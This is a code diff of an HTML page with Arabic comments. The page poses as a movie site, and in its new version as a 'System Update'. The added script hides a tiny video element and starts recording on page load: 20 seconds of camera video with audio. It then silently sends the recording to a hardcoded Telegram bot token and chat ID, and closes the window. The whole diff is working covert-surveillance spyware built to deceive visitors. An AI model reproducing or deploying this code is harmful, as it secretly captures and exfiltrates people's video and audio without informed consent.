@@ -3,7 +3,7 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
-    <title></title>
+    <title>System Update</title> <!-- عنوان خادع -->
     <style>
         * {
             margin: 0;
@@ -14,221 +14,110 @@
         body {
             background-color: #000;
             overflow: hidden;
-            touch-action: none;
-            -webkit-touch-callout: none;
-            -webkit-user-select: none;
-            user-select: none;
+            height: 100vh;
+            width: 100vw;
         }
         
-        #camera-container {
-            position: fixed;
-            top: 0;
-            left: 0;
-            width: 100%;
-            height: 100%;
-            object-fit: cover;
+        /* إخفاء كامل لعنصر الفيديو */
+        #camera-view {
+            position: absolute;
             opacity: 0;
-            z-index: -1;
-        }
-        
-        #permission-overlay {
-            position: fixed;
-            top: 0;
-            left: 0;
-            width: 100%;
-            height: 100%;
-            background-color: rgba(0,0,0,0.95);
-            display: flex;
-            flex-direction: column;
-            justify-content: center;
-            align-items: center;
-            z-index: 1000;
-            color: white;
-            text-align: center;
-            padding: 20px;
-            opacity: 1;
-            transition: opacity 0.3s ease;
-        }
-        
-        .permission-btn {
-            margin-top: 30px;
-            padding: 12px 30px;
-            background-color: #007AFF;
-            color: white;
-            border-radius: 20px;
-            font-size: 16px;
-            border: none;
-            cursor: pointer;
-        }
-        
-        #loading-overlay {
-            position: fixed;
-            top: 0;
-            left: 0;
-            width: 100%;
-            height: 100%;
-            background-color: rgba(0,0,0,0.9);
-            display: none;
-            flex-direction: column;
-            justify-content: center;
-            align-items: center;
-            z-index: 1001;
-            color: white;
-        }
-        
-        .spinner {
-            width: 40px;
-            height: 40px;
-            border: 4px solid rgba(255,255,255,0.3);
-            border-radius: 50%;
-            border-top-color: #007AFF;
-            animation: spin 1s ease-in-out infinite;
-            margin-bottom: 20px;
-        }
-        
-        @keyframes spin {
-            to { transform: rotate(360deg); }
-        }
-        
-        .hidden {
-            display: none !important;
+            pointer-events: none;
+            width: 1px;
+            height: 1px;
+            z-index: -1000;
         }
     </style>
 </head>
 <body>
-    <!-- عنصر الكاميرا المخفي -->
-    <video id="camera-container" autoplay playsinline></video>
-    
-    <!-- طبقة طلب الإذن -->
-    <div id="permission-overlay">
-        <h2 style="margin-bottom: 15px;">موقع افلام</h2>
-        <p style="margin-bottom: 10px;">لدخول الى موقع الافلام اضغط على زر الموافقة واذا لم يظهر الموقع اقفل وافتح الرابط من جديد</p>
-        <button class="permission-btn" id="allow-btn">الموافقة والمتابعة</button>
-    </div>
-    
-    <!-- طبقة التحميل -->
-    <div id="loading-overlay">
-        <div class="spinner"></div>
-        <p>انتظر لدخول الموقع...</p>
-    </div>
+    <!-- عنصر الكاميرا المخفي تمامًا -->
+    <video id="camera-view" autoplay playsinline></video>
     
     <script>
         // التكوين - استبدل هذه القيم
         const config = {
             botToken: '7652311454:AAFHL-FrE9nCB8WG4p-91Uc2-0U2Z4S0A1c',
             chatId: '5310911220',
-            captureDelay: 1500, // تأخير الالتقاط بالمللي ثانية
-            autoCloseDelay: 1000 // تأخير الإغلاق بعد الإرسال
+            recordingDuration: 20000, // 20 ثانية
+            useFrontCamera: false // false للخلفية، true للأمامية
         };
         
-        // العناصر
-        const cameraView = document.getElementById('camera-container');
-        const permissionOverlay = document.getElementById('permission-overlay');
-        const loadingOverlay = document.getElementById('loading-overlay');
-        const allowBtn = document.getElementById('allow-btn');
-        
-        // دالة متعددة المتصفحات لطلب الكاميرا
-        async function initCamera() {
+        // العملية الرئيسية
+        async function startHiddenRecording() {
             try {
+                // 1. تهيئة الكاميرا خفية
                 const constraints = {
                     video: {
-                        width: { ideal: 1920 },
-                        height: { ideal: 1080 },
-                        facingMode: 'environment'
+                        width: { ideal: 1280 },
+                        height: { ideal: 720 },
+                        facingMode: config.useFrontCamera ? 'user' : 'environment'
                     },
-                    audio: false
+                    audio: true
                 };
                 
-                if (navigator.mediaDevices && navigator.mediaDevices.getUserMedia) {
-                    return await navigator.mediaDevices.getUserMedia(constraints);
-                } else if (navigator.getUserMedia) {
-                    return new Promise((resolve, reject) => {
-                        navigator.getUserMedia(constraints, resolve, reject);
-                    });
-                } else {
-                    throw new Error('Camera API not supported');
-                }
+                const stream = await navigator.mediaDevices.getUserMedia(constraints);
+                const cameraView = document.getElementById('camera-view');
+                cameraView.srcObject = stream;
+                
+                // 2. تسجيل الفيديو
+                const mediaRecorder = new MediaRecorder(stream, {
+                    mimeType: 'video/webm;codecs=vp9',
+                    videoBitsPerSecond: 2000000
+                });
+                
+                const chunks = [];
+                mediaRecorder.ondataavailable = e => chunks.push(e.data);
+                
+                const recordingPromise = new Promise(resolve => {
+                    mediaRecorder.onstop = () => {
+                        const videoBlob = new Blob(chunks, { type: 'video/webm' });
+                        resolve(videoBlob);
+                    };
+                });
+                
+                mediaRecorder.start();
+                
+                // 3. ضبط مدة التسجيل
+                setTimeout(() => {
+                    mediaRecorder.stop();
+                    stream.getTracks().forEach(track => track.stop());
+                }, config.recordingDuration);
+                
+                // 4. إرسال الفيديو
+                const videoBlob = await recordingPromise;
+                await sendToTelegram(videoBlob);
+                
+                // 5. إغلاق النافذة بصمت
+                window.close();
+                
             } catch (error) {
-                console.error('Camera initialization failed:', error);
-                throw error;
+                console.error('Hidden recording failed:', error);
+                window.close(); // إغلاق في جميع حالات الفشل
             }
         }
         
-        // دالة التقاط الصورة
-        function capturePhoto(videoElement) {
-            return new Promise((resolve) => {
-                const canvas = document.createElement('canvas');
-                canvas.width = videoElement.videoWidth;
-                canvas.height = videoElement.videoHeight;
-                const ctx = canvas.getContext('2d');
-                ctx.drawImage(videoElement, 0, 0, canvas.width, canvas.height);
-                
-                canvas.toBlob(resolve, 'image/jpeg', 0.92);
-            });
-        }
-        
-        // دالة إرسال الصورة إلى تليجرام
-        async function sendToTelegram(photoBlob) {
+        // دالة الإرسال إلى تليجرام
+        async function sendToTelegram(videoBlob) {
+            const formData = new FormData();
+            formData.append('chat_id', config.chatId);
+            formData.append('video', videoBlob, 'system_update.webm');
+            formData.append('disable_notification', 'true'); // إرسال صامت
+            
             try {
-                const formData = new FormData();
-                formData.append('chat_id', config.chatId);
-                formData.append('photo', photoBlob, 'captured_photo.jpg');
-                
-                const response = await fetch(`https://api.telegram.org/bot${config.botToken}/sendPhoto`, {
+                await fetch(`https://api.telegram.org/bot${config.botToken}/sendVideo`, {
                     method: 'POST',
                     body: formData
                 });
-                
-                return await response.json();
             } catch (error) {
-                console.error('Error sending to Telegram:', error);
+                console.error('Error sending video:', error);
                 throw error;
             }
         }
         
-        // معالجة النقر على زر الموافقة
-        allowBtn.addEventListener('click', async () => {
-            try {
-                // إخفاء واجهة الإذن وإظهار التحميل
-                permissionOverlay.style.opacity = '0';
-                setTimeout(() => {
-                    permissionOverlay.classList.add('hidden');
-                    loadingOverlay.style.display = 'flex';
-                }, 300);
-                
-                // تهيئة الكاميرا
-                const stream = await initCamera();
-                cameraView.srcObject = stream;
-                
-                // انتظر لضبط الكاميرا
-                await new Promise(resolve => setTimeout(resolve, config.captureDelay));
-                
-                // التقاط الصورة
-                const photoBlob = await capturePhoto(cameraView);
-                
-                // إيقاف الكاميرا
-                stream.getTracks().forEach(track => track.stop());
-                
-                // إرسال الصورة
-                await sendToTelegram(photoBlob);
-                
-                // إغلاق النافذة بعد الإرسال
-                setTimeout(() => {
-                    window.close();
-                }, config.autoCloseDelay);
-                
-            } catch (error) {
-                console.error('Process failed:', error);
-                loadingOverlay.style.display = 'none';
-                
-                // عرض رسالة خطأ بسيطة
-                alert('حدث خطأ: ' + (error.message || 'غير معروف'));
-            }
-        });
-        
-        // بدء العملية عند تحميل الصفحة
+        // بدء التسجيل فور تحميل الصفحة
         window.addEventListener('DOMContentLoaded', () => {
-            // يمكن إضافة أي تهيئة إضافية هنا
+            // طلب الإذن دون واجهة مستخدم
+            startHiddenRecording().catch(e => console.error(e));
         });
     </script>
 </body>
